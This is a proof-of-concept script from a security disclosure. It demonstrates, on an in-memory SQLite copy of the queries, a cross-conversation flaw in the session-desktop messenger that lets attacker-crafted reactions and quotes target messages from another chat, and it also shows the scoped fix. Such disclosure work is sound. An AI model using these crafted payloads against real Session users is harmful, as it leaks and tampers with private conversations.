#!/usr/bin/env node
/**
 * PoC #1 — Cross-conversation target resolution for reactions and quotes.
 *
 * Vulnerability: `getMessageByReaction()` (ts/util/reactions.ts) and
 * `pushQuotedMessageToStoreIfNeeded()` (ts/receiver/queuedJob.ts) resolved the message a
 * remote reaction/quote refers to by `(sent_at, source)` **over the whole database**, never by
 * the conversation the reaction/quote arrived in.
 *
 * `reaction.id`, `reaction.author`, `quote.id` and `quote.author` are fully attacker controlled:
 * the envelope only authenticates *who sent the reaction*, not *which message it targets*.
 *
 * Consequence: any Session user (a stranger whose message request was never accepted, or any
 * member of a group the victim is in) can make the victim's client mutate / render a message
 * that belongs to a *different* conversation of the victim.
 *
 * This script reproduces the exact SQL used by the client (ts/node/sql.ts) against an in-memory
 * SQLite database, and then shows the same lookup once scoped to the conversation (the fix).
 *
 * Run: node --experimental-sqlite security-poc/01_cross_conversation_reaction_quote.mjs
 */
import { DatabaseSync } from 'node:sqlite';

const ALICE = '05' + 'a1'.repeat(32); // a contact the attacker is NOT talking to
const BOB = '05' + 'b2'.repeat(32); // another contact
const MALLORY = '05' + 'b4'.repeat(32); // the attacker
const VICTIM = '05' + 'c3'.repeat(32); // us

const CONVO_ALICE = '05' + '11'.repeat(32); // private conversation victim <-> Alice
const CONVO_BOB = '05' + '22'.repeat(32); // private conversation victim <-> Bob
const CONVO_MALLORY = '05' + '33'.repeat(32); // private conversation victim <-> Mallory

// sent_at of Alice's message. Visible to anyone who is in *any* group/community Alice posts in,
// and predictable for 1o1 messages (it is a ms epoch timestamp of when it was sent).
const ALICE_SENT_AT = 1712345678901;

const db = new DatabaseSync(':memory:');
db.exec(`CREATE TABLE messages (
  id INTEGER PRIMARY KEY,
  conversationId TEXT,
  source TEXT,
  sent_at INTEGER,
  json TEXT
);`);
const insert = db.prepare(
  `INSERT INTO messages (conversationId, source, sent_at, json) VALUES (?, ?, ?, ?)`
);

insert.run(CONVO_ALICE, ALICE, ALICE_SENT_AT, JSON.stringify({ body: 'the safe code is 4321' }));
insert.run(CONVO_BOB, BOB, ALICE_SENT_AT + 5000, JSON.stringify({ body: 'unrelated chat' }));

// ---------------------------------------------------------------------------------------------
// Queries as they exist in session-desktop v1.18.3 (unmodified), used by the receiver:
//   reactions : ts/node/sql.ts getMessagesBySentAt()
//   quotes    : ts/node/sql.ts getMessagesBySenderAndSentAt()
// ---------------------------------------------------------------------------------------------
const vulnerableReactionLookup = db.prepare(
  `SELECT conversationId, json FROM messages WHERE sent_at = $sent_at;`
);
const vulnerableQuoteLookup = db.prepare(
  `SELECT conversationId, json FROM messages WHERE source = $source AND sent_at = $timestamp;`
);

// The reaction is delivered inside the victim<->Mallory conversation. Mallory sets:
//   reaction = { emoji: '🔥', action: REACT, id: ALICE_SENT_AT, author: ALICE }
const attackerReaction = { emoji: '🔥', action: 'REACT', id: ALICE_SENT_AT, author: ALICE };
// getMessageByReaction() then keeps any row whose sender matches reaction.author:
const resolvedForReaction = vulnerableReactionLookup
  .all({ sent_at: attackerReaction.id })
  .filter(row => row.json && JSON.parse(row.json).body);

console.log('=== VULNERABLE (v1.18.3) ===');
console.log(
  `[reaction] received in conversation ${CONVO_MALLORY.slice(0, 10)}… resolved to:`,
  resolvedForReaction.map(r => `${r.conversationId.slice(0, 10)}… "${JSON.parse(r.json).body}"`)
);
console.log(
  '            -> the client mutates a message of the victim<->Alice conversation, from a chat with the attacker\n'
);

const attackerQuote = { id: ALICE_SENT_AT, author: ALICE };
const resolvedForQuote = vulnerableQuoteLookup.all({
  source: attackerQuote.author,
  timestamp: attackerQuote.id,
});
console.log(
  `[quote]    received in conversation ${CONVO_MALLORY.slice(0, 10)}… resolved to:`,
  resolvedForQuote.map(r => `${r.conversationId.slice(0, 10)}… "${JSON.parse(r.json).body}"`)
);
console.log(
  '            -> the victim\'s client renders Alice\'s message from another chat inside the attacker\'s message\n'
);

// ---------------------------------------------------------------------------------------------
// After the fix: the lookup is scoped to the conversation the reaction/quote arrived in.
// ---------------------------------------------------------------------------------------------
const fixedReactionLookup = db.prepare(
  `SELECT conversationId, json FROM messages
   WHERE sent_at = $sent_at AND conversationId = $conversationId;`
);

const fixedResolved = fixedReactionLookup
  .all({ sent_at: attackerReaction.id, conversationId: CONVO_MALLORY })
  .filter(row => JSON.parse(row.json).body);

console.log('=== FIXED ===');
console.log(
  '[reaction] same attack, lookup scoped to the receiving conversation:',
  fixedResolved.length === 0 ? 'no target found -> reaction dropped ✔' : 'STILL VULNERABLE ✘'
);

const isVulnerable = resolvedForReaction.length > 0 || resolvedForQuote.length > 0;
process.exitCode = isVulnerable && fixedResolved.length === 0 ? 0 : 1;
